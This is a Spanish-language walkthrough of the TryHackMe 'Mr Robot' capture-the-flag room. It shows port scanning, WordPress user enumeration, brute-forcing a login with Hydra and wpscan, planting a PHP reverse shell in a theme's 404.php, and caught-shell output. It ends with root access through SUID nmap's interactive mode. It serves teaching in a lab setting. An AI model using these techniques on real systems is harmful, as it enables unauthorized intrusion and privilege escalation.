---
title: Mr Robot Writeup - TryHackMe
date: 2023-04-05
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Medium, WordPress, SUID]
img_path: /assets/img/commons/mrrobot/
image: mrrobot.jpeg
---

¡Hola!

En este writeup, exploraremos la sala [**Mr Robot CTF**](https://tryhackme.com/room/mrrobot) de TryHackMe, de dificultad media según la plataforma. A través de esta sala temática de Mr Robot, aprenderemos a explotar un servidor web que utiliza el CMS WordPress y escalaremos privilegios aprovechando una versión obsoleta de nmap. El objetivo es encontrar tres llaves ocultas en la máquina.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.126.203
PING 10.10.126.203 (10.10.126.203) 56(84) bytes of data.
64 bytes from 10.10.126.203: icmp_seq=1 ttl=61 time=277 ms

--- 10.10.126.203 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 276.572/276.572/276.572/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.126.203 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `-Pn`: indica que se debe omitir el descubrimiento de hosts y asumir que todos los objetivos están vivos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.126.203`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts.txt`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 22:45 -05
Nmap scan report for 10.10.126.203
Host is up (0.35s latency).
Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
```

Vemos que únicamente tenemos dos puertos habilitados, `HTTP (80)` y `HTTPS (443)`.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 80,443 -sV -sC --min-rate 5000 10.10.126.203 -oN services.txt
```

Donde:

- `-p 80,443`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.126.203`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal (fácil de leer por humanos) en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 22:48 -05
Nmap scan report for 10.10.126.203
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.71 seconds
```

En el reporte no nos reevela nada interesante.

### HTTP - 80

Al identificar un servicio HTTP en el puerto 80, exploramos la página web y comprobamos que se trata de una página web interactiva de la serie "*Mr Robot*" en la que se nos presenta una especie de terminal.

![web](web.png)

Esta terminal cuenta con un par de comandos personalizados, cada uno de ellos nos lleva diferentes directorios donde podremos ver algunas imágenes, documentos y videos de la serie *Mr Robot*. Sin embargo, nada de esto es relevante para nuestro análisis ni acceso al sistema.

> El servicio HTTPS es un espejo del HTTP, es decir, muestran exactamente la misma información.
{: .prompt-info }

Luego, empleamos la herramienta `wfuzz` para llevar a cabo la búsqueda de directorios y archivos en la página web mediante fuzzing.

```bash
❯ wfuzz -c -L -t 100 --hc=404,403 --hh=1188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.126.203/FUZZ
```

Donde:

- `-c`: muestra la salida con colores.
- `-L`: sigue las redirecciones HTTP.
- `-t 100`: establece el número de hilos concurrentes.
- `–hc=404,403`: oculta las respuestas HTTP con los códigos 404 y 403.
- `w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: usa el archivo indicado como diccionario de palabras para el fuzzing.
- `http://10.10.126.203/FUZZ`: usa la URL indicada como objetivo del fuzzing, reemplazando la palabra FUZZ por cada palabra del diccionario.

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.126.203/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000043:   200        0 L      0 W        0 Ch        "sitemap"                                                                                                            
000000053:   200        52 L     158 W      2671 Ch     "login"                                                                                                              
000000037:   200        21 L     31 W       809 Ch      "rss"                                                                                                                
000000241:   200        0 L      0 W        0 Ch        "wp-content"                                                                                                         
000000126:   200        21 L     31 W       809 Ch      "feed"                                                                                                               
000000124:   200        121 L    385 W      8341 Ch     "0"                                                                                                                  
000000169:   200        17 L     32 W       624 Ch      "atom"                                                                                                               
000000163:   200        154 L    555 W      11839 Ch    "image"                                                                                                              
000000348:   200        2027 L   19569 W    489204 Ch   "intro"                                                                                                              
000000475:   200        52 L     158 W      2671 Ch     "wp-login"                                                                                                           
000000679:   200        156 L    27 W       309 Ch      "license"                                                                                                            
000000551:   200        21 L     31 W       809 Ch      "rss2"                                                                                                               
000000980:   200        154 L    555 W      11839 Ch    "Image"                                                                                                              
000001604:   200        23 L     32 W       809 Ch      "rdf"                                                                                                                
000001765:   200        3 L      4 W        41 Ch       "robots"                                                                                                             
000001730:   200        1 L      14 W       64 Ch       "readme"
```

A partir del resultado, podemos identificar que existe un portal de inicio de sesión de WordPress en `/login`, el cual nos redirecciona a `/wp-login.php`.

![login](login.png)

Una estrategia útil para enumerar usuarios válidos en WordPress es utilizar el panel de inicio de sesión, ya que aunque no conozcamos la contraseña, podemos verificar si el usuario existe. Si el intento de inicio de sesión falla, el mensaje de error que se devuelve suele incluir el nombre de usuario, como en el caso de "*The password you entered for the username admin is incorrect*", lo que sugiere que el usuario existe pero la contraseña es incorrecta.

En este contexto, realizamos pruebas con algunos usuarios predeterminados, pero no logramos tener éxito.

Durante la búsqueda de directorios mediante fuzzing, también identificamos `/0` como un directorio sospechoso. Al ingresar a él, encontramos el siguiente blog:

![0](0.png)

Con la herramienta `Wappalyzer`, llevamos a cabo la enumeración de las tecnologías utilizadas en el sitio web. Entre la información más relevante obtenida, destacan la versión de WordPress (`4.3.1`) y PHP (`5.5.29`).

![wappalyzer](wappalyzer.png)

Si continuamos enumerando otros directorios, descubriremos que en el archivo `robots.txt` existen dos ubicaciones ocultas.

![robots](robots.png)

Al acceder al archivo `key-1-of-3.txt` desde el navegador web obtenemos la primera flag que nos solicita la plataforma:

![key1](key1.png)

Al intentar acceder a `fsocity.dic`, se descarga el archivo directamente. Al inspeccionarlo, se puede observar que se trata de un diccionario con 858160 entradas.

```bash
❯ head fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window
❯ wc -l fsocity.dic
858160 fsocity.dic
```
Esto nos hace sospechar que el objetivo es realizar un ataque de fuerza bruta en el panel de `WordPress`. Con el fin de tener un diccionario más limpio y optimizado, podemos eliminar los nombres repetidos. Como resultado, logramos reducir el diccionario a 11451 entradas.

```bash
❯ sort fsocity.dic | uniq > fsocity_sorted.dic
❯ wc -l fsocity_sorted.dic
11451 fsocity_sorted.dic
```

Dado que esta sala está inspirada en la serie **Mr. Robot**, podemos optimizar aún más nuestro diccionario filtrando únicamente las palabras relacionadas con algunos personajes de la serie.

```bash
❯ cat fsocity_sorted.dic | grep -wE "elliot|angela|darlene|tyrell|whiterose|joanna|shayla|irving|fernando"
angela
darlene
elliot
joanna
tyrell
whiterose
❯ cat fsocity_sorted.dic | grep -wE "elliot|angela|darlene|tyrell|whiterose|joanna|shayla|irving|fernando" > users.dic
```

## Explotación

---

Una vez obtenido nuestro diccionario de usuarios, procedemos a utilizar la herramienta **Hydra** para llevar a cabo la enumeración de los usuarios registrados en el panel de WordPress. Para ello, utilizamos el siguiente comando:

```bash
❯ hydra -L users.dic -p test 10.10.126.203 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.126.203%2Fwp-admin%2F&testcookie=1:F=Invalid username' -t 64
```

Donde:

- `-L users.dic`: indica que se usará el archivo users.dic como una lista de nombres de usuario para probar.
- `-p test`: indica que se usará la contraseña “test” para todos los nombres de usuario.
- `10.10.126.203`: indica la dirección IP del servidor objetivo.
- `http-post-form`: indica que se usará el método HTTP POST para enviar los datos del formulario.
- `'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.126.203%2Fwp-admin%2F&testcookie=1:F=Invalid username'`: indica la ruta del formulario de inicio de sesión de WordPress, los parámetros que se enviarán con los marcadores `^USER^` y `^PASS^` que se reemplazarán por los valores de la lista y la contraseña, y el texto “Invalid username” que se usará para detectar un inicio de sesión fallido.
- `-t 64`: indica que se usarán 64 hilos concurrentes para realizar el ataque.

```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-06 00:32:41
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking http-post-form://10.10.126.203:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.126.203%2Fwp-admin%2F&testcookie=1:Invalid username
[80][http-post-form] host: 10.10.126.203   login: elliot   password: test
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-06 00:32:43
```

El análisis realizado nos revela que el usuario `elliot` tiene una cuenta en el panel de WordPress. Por lo tanto, a contiuación empleamos la herramienta `wpscan` para ejecutar un ataque de fuerza bruta y encontrar una contraseña válida para dicho usuario.

```bash
❯ wpscan --url http://10.10.126.203/wp-login.php -U elliot -P fsocity_sorted.dic -t 100
```

Donde:

- `–-url http://10.10.126.203/wp-login.php`: indica la URL del formulario de inicio de sesión de WordPress que se va a escanear.
- `-U elliot`: indica que se usará el nombre de usuario “elliot” para probar las contraseñas.
- `-P fsocity_sorted.dic`: indica que se usará el archivo fsocity_sorted.dic como una lista de contraseñas para probar.
- `-t 100`: indica que se usarán 100 hilos concurrentes para realizar el escaneo.

```bash
[...]

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                                                        
Trying elliot / exception Time: 00:02:49 <=================================                                                                     > (5700 / 17151) 33.23%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[...]
```

Observamos que hemos obtenido con éxito la contraseña válida `ER28-0652` para el usuario `elliot`. Con estas credenciales accedemos al panel de WordPress.

![wp-admin](wp-admin.png)

Ya que hemos iniciado sesión, podemos modificar un archivo `.php` del tema actualmente utilizado.

Para ello, nos dirigimos a la sección `Appearance` del panel de control de WordPress, luego seleccionamos `Editor`. 

![wp-admin1](wp-admin1.png)

A continuación, se recomienda seleccionar el archivo `404.php` del lado derecho. Para este propósito, usaremos el script [PHP PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), especificando la dirección IP de la máquina atacante y el puerto de escucha correspondiente.

![template](template.png)

Después de agregar la línea de código mencionada, actualizamos el archivo modificado en el servidor.

Realizamos una inspección minuciosa en el repositorio de WordPress y determinamos que la ruta correspondiente al archivo `404.php` es `/wp-content/themes/twentyfifteen/404.php`.

Para obtener acceso a la máquina, iniciamos la escucha del puerto especificado en el código (`443`) y posteriormente accedemos a la ruta `/wp-content/themes/twentyfifteen/404.php` desde el navegador.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.126.203] 39308
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:54:06 up  2:11,  0 users,  load average: 0.00, 0.19, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
Después de obtener acceso al sistema como usuario `daemon`, procedemos a ejecutar el siguiente comando para obtener una shell más interactiva:

```bash
$ python -c 'import pty;pty.spawn ("/bin/bash")'
daemon@linux:/$
```

### Pivoting horizontal

Accedimos al sistema como el usuario `daemon`, pero el usuario principal de la máquina es robot. Si dirigimos al directorio `/home/robot/` encontramos dos archivos interesantes.

```bash
daemon@linux:/$ cd /home/robot/
cd /home/robot/
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt	password.raw-md5
```
Al intentar acceder a la segunda flag, se puede observar que no poseemos los permisos necesarios para su lectura.

```bash
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```
En cambio, al acceder al archivo `password.raw-md5`, podemos leer su contenido exitosamente. Por el nombre del archivo, fácilmente nos damos cuenta de que se trata de una contraseña hasheada en formato MD5.

```bash
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e400****************
```

Procedemos a crackear la contraseña con la herramienta **John the Ripper** especificando el formato respectivo.

```bash
❯ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)     
1g 0:00:00:00 DONE (2023-04-06 01:04) 100.0g/s 4070Kp/s 4070Kc/s 4070KC/s bonjour1..teletubbies
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Podemos observar que hemos obtenido con éxito la contraseña en texto plano. A continuación, podemos cambiar al usuario `robot` proporcionando la contraseña obtenida.

```bash
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

Como usuario `robot` ya podemos leer la segunda flag.

```bash
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694****************
```

## Escalación de privilegios

---

Si ejecutamos el siguiente comando para obtener la lista de los binarios con permisos **SUID**, obtenemos los siguientes resultados:

```bash
find / -perm -4000 -uid 0 -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

### Abuso del binario nmap con SUID

Nos llama la atención especialmente el binario `nmap` ya que no es típico que este binario posea este tipo de permisos. Si realizamos una consulta en [GTFOBins](https://gtfobins.github.io/) encontramos que con este binario podemos activar el modo interactivo, disponible en las versiones `2.02` a `5.21` y así ejecutar comandos de shell.

![nmap](nmap.png)

Verificamos la versión de `nmap` disponible en el sistema.

```bash
robot@linux:~$ /usr/local/bin/nmap --version
/usr/local/bin/nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

Una vez que hemos obtenido acceso como usuario `root`, podemos ingresar a su directorio principal y leer la última bandera de la máquina.

```bash
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
```

Finalmente, podemos acceder a la bandera del usuario root en su directorio principal y leerla.

```bash
# cd /root
cd /root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee****************
```

¡Happy Hacking!
